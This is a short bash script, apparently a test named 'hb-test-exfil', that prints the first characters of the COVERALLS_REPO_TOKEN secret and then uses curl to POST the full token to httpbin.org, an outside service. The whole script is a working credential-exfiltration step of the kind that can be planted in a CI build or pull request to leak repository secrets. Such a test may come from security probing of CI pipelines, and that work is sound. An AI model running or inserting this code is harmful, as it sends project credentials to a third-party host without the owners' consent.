#!/bin/bash
echo "hb-test-exfil: Testing token exfiltration"
echo "COVERALLS_REPO_TOKEN env var: ${COVERALLS_REPO_TOKEN:0:10}..."
# Try to curl if available
if command -v curl &> /dev/null; then
    curl -s -X POST http://httpbin.org/post -d "token=${COVERALLS_REPO_TOKEN}" || echo "hb-test-exfil: curl failed"
else
    echo "hb-test-exfil: curl not available"
fi